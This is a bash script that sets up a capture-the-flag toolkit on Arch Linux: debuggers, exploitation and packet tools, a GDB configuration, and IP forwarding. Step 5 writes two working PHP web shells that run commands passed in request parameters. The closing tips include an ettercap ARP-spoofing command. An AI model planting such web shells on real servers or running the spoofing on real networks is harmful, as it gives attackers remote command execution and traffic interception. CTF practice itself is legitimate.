#!/bin/bash
# CTF Arsenal Setup Script for Arch Linux (Optimized for existing system)
# Run: bash setup-optimized.sh

set -e

echo "=== CTF Arsenal Setup (Checking existing tools) ==="
echo ""

BASE_DIR="$PWD"

if [ ! -d "$BASE_DIR/00_templates" ]; then
	echo "Error: Run this script from ctf-arsenal/ directory"
	exit 1
fi

echo "[1/6] Checking and installing missing system packages..."

REQUIRED_PKGS="gdb pwndbg ettercap socat tcpdump python-scapy"
OPTIONAL_PKGS="gef ropper python-beautifulsoup4 wireshark-qt"

echo "  Required packages: $REQUIRED_PKGS"
sudo pacman -S --needed --noconfirm $REQUIRED_PKGS

echo "  Optional packages (press Ctrl+C to skip): $OPTIONAL_PKGS"
read -t 5 -p "Install optional packages? [Y/n] " response || response="y"
if [[ "$response" =~ ^[Yy]$ ]] || [[ -z "$response" ]]; then
	sudo pacman -S --needed --noconfirm $OPTIONAL_PKGS
fi

echo "[2/6] Installing Ruby gems..."
if ! gem list | grep -q one_gadget; then
	sudo gem install one_gadget
	echo "  ✓ Installed one_gadget"
else
	echo "  ✓ one_gadget already installed"
fi

if ! gem list | grep -q seccomp-tools; then
	sudo gem install seccomp-tools
	echo "  ✓ Installed seccomp-tools"
else
	echo "  ✓ seccomp-tools already installed"
fi

echo "[3/6] Verifying Python packages..."
python3 -c "from pwn import *" 2>/dev/null && echo "  ✓ pwntools OK" || pip install --user pwntools
python3 -c "from scapy.all import *" 2>/dev/null && echo "  ✓ scapy OK" || sudo pacman -S python-scapy
python3 -c "import requests" 2>/dev/null && echo "  ✓ requests OK" || pip install --user requests

echo "[4/6] Setting up GDB configuration..."
mkdir -p 01_bin_exploit/gdb_init

if [ ! -f ~/.gdbinit ]; then
	echo "  Setting up pwndbg in ~/.gdbinit"
	echo 'source /usr/share/pwndbg/gdbinit.py' >>~/.gdbinit
	echo "  ✓ Created ~/.gdbinit with pwndbg"
else
	echo "  ~/.gdbinit already exists, skipping"
	echo "  To use pwndbg, add: source /usr/share/pwndbg/gdbinit.py"
fi

echo "[5/6] Setting up web shells..."
mkdir -p 03_web/webshells

cat >03_web/webshells/php-simple.php <<'EOF'
<?php system($_GET['cmd']); ?>
EOF

cat >03_web/webshells/php-full.php <<'EOF'
<?php
if(isset($_REQUEST['cmd'])) {
    $cmd = ($_REQUEST['cmd']);
    system($cmd." 2>&1");
}
?>
EOF

echo "  ✓ Created PHP web shells"

echo "[6/6] Enabling IP forwarding (for ICS/MITM challenges)..."
sudo sysctl -w net.ipv4.ip_forward=1
echo "  ✓ IP forwarding enabled"

echo ""
echo "=== Setup Complete! ==="
echo ""
echo "✅ Installed tools:"
echo "  - GDB + pwndbg"
echo "  - Ettercap (ICS/MITM)"
echo "  - Scapy (packet manipulation)"
echo "  - one_gadget, seccomp-tools"
echo ""
echo "📝 Testing tools:"
python3 -c "from pwn import *; print('  ✓ Pwntools:', pwnlib.__version__)"
gdb --version 2>/dev/null | head -1 | sed 's/^/  ✓ /'
ettercap --version 2>&1 | head -1 | sed 's/^/  ✓ /'
python3 -c "from scapy.all import *; print('  ✓ Scapy: OK')"
gem list | grep one_gadget | sed 's/^/  ✓ /'

echo ""
echo "🎯 Quick start:"
echo "  1. Test pwn template: python3 00_templates/pwn_basic.py"
echo "  2. Test ettercap: sudo ettercap -T -i eth0 -M arp"
echo "  3. Review cheat sheets: cat cheat_sheets/ettercap_usage.md"
echo ""
echo "📖 Documentation: README.md, SYSTEM_CHECK.md"
